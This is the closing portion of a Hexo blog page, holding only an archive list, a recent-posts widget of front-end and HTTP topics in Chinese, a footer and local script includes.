      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/18/ZH002/">浏览器中的进程</a>
          </li>
        
          <li>
            <a href="/2021/06/26/HTTP013/">HTTP缓存</a>
          </li>
        
          <li>
            <a href="/2021/05/31/HTTP012/">JSONP</a>
          </li>
        
          <li>
            <a href="/2021/05/26/HTTP011/">常见 Web 攻击总结</a>
          </li>
        
          <li>
            <a href="/2021/05/17/Vue007/">【Vue3.x】Vue3响应式原理</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>